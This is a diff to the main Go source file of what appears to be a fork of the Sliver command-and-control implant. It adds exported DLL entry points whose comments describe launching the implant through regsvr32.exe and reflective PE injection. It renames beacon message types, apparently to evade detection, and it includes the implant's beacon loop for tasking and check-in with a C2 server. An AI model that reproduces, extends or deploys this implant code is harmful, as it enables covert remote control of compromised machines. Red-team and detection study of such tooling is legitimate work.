@@ -35,21 +35,22 @@ import (
 
 	// {{if .Config.IsBeacon}}
 	"sync"
+
 	// {{end}}
 
 	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
 
-	consts "github.com/bishopfox/sliver/implant/sliver/constants"
-	"github.com/bishopfox/sliver/implant/sliver/handlers"
-	"github.com/bishopfox/sliver/implant/sliver/hostuuid"
-	"github.com/bishopfox/sliver/implant/sliver/limits"
-	"github.com/bishopfox/sliver/implant/sliver/locale"
-	"github.com/bishopfox/sliver/implant/sliver/pivots"
-	"github.com/bishopfox/sliver/implant/sliver/transports"
-	"github.com/bishopfox/sliver/implant/sliver/version"
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	consts "github.com/gsmith257-cyber/better-sliver-package/implant/sliver/constants"
+	"github.com/gsmith257-cyber/better-sliver-package/implant/sliver/handlers"
+	"github.com/gsmith257-cyber/better-sliver-package/implant/sliver/hostuuid"
+	"github.com/gsmith257-cyber/better-sliver-package/implant/sliver/limits"
+	"github.com/gsmith257-cyber/better-sliver-package/implant/sliver/locale"
+	"github.com/gsmith257-cyber/better-sliver-package/implant/sliver/pivots"
+	"github.com/gsmith257-cyber/better-sliver-package/implant/sliver/transports"
+	"github.com/gsmith257-cyber/better-sliver-package/implant/sliver/version"
+	"github.com/gsmith257-cyber/better-sliver-package/protobuf/sliverpb"
 
 	"github.com/gofrs/uuid"
 	"google.golang.org/protobuf/proto"
@@ -113,15 +114,42 @@ func (serv *sliverService) Execute(args []string, r <-chan svc.ChangeRequest, ch
 // {{if or .Config.IsSharedLib .Config.IsShellcode}}
 var isRunning bool = false
 
-// {{range .Config.Exports}}
-//export {{.}}
-func {{.}} () {
+// StartW - Export for shared lib build
+//
+//export StartW
+func StartW() {
 	if !isRunning {
 		isRunning = true
 		main()
 	}
 }
-// {{end}}
+
+// Thanks Ne0nd0g for those
+//https://github.com/Ne0nd0g/merlin/blob/master/cmd/merlinagentdll/main.go#L65
+
+// VoidFunc is an exported function used with PowerSploit's Invoke-ReflectivePEInjection.ps1
+//
+//export VoidFunc
+func VoidFunc() { main() }
+
+// DllInstall is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /n /i sliver.dll)
+// https://msdn.microsoft.com/en-us/library/windows/desktop/bb759846(v=vs.85).aspx
+//
+//export DllInstall
+func DllInstall() { main() }
+
+// DllRegisterServer - is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s sliver.dll)
+// https://msdn.microsoft.com/en-us/library/windows/desktop/ms682162(v=vs.85).aspx
+//
+//export DllRegisterServer
+func DllRegisterServer() { main() }
+
+// DllUnregisterServer - is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /u sliver.dll)
+// https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
+//
+//export DllUnregisterServer
+func DllUnregisterServer() { main() }
+
 // {{end}}
 
 func main() {
@@ -159,6 +187,7 @@ func main() {
 }
 
 // {{if .Config.IsBeacon}}
+
 func beaconStartup() {
 	// {{if .Config.Debug}}
 	log.Printf("Running in Beacon mode with ID: %s", InstanceID)
@@ -262,7 +291,7 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 	register := registerSliver()
 	register.ActiveC2 = beacon.ActiveC2
 	register.ProxyURL = beacon.ProxyURL
-	beacon.Send(wrapEnvelope(sliverpb.MsgBeaconRegister, &sliverpb.BeaconRegister{
+	beacon.Send(wrapEnvelope(sliverpb.MsgBeaconRegister, &sliverpb.BaconRegister{
 		ID:          InstanceID,
 		Interval:    beacon.Interval(),
 		Jitter:      beacon.Jitter(),
@@ -328,7 +357,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 	// {{if .Config.Debug}}
 	log.Printf("[beacon] sending check in ...")
 	// {{end}}
-	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
+	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BaconTasks{
 		ID:          InstanceID,
 		NextCheckin: int64(beacon.Duration().Seconds()),
 	}))
@@ -354,7 +383,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 		// {{end}}
 		return nil
 	}
-	tasks := &sliverpb.BeaconTasks{}
+	tasks := &sliverpb.BaconTasks{}
 	err = proto.Unmarshal(envelope.Data, tasks)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -391,7 +420,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 		results = append(results, r)
 	}
 
-	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
+	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BaconTasks{
 		ID:    InstanceID,
 		Tasks: results,
 	}))
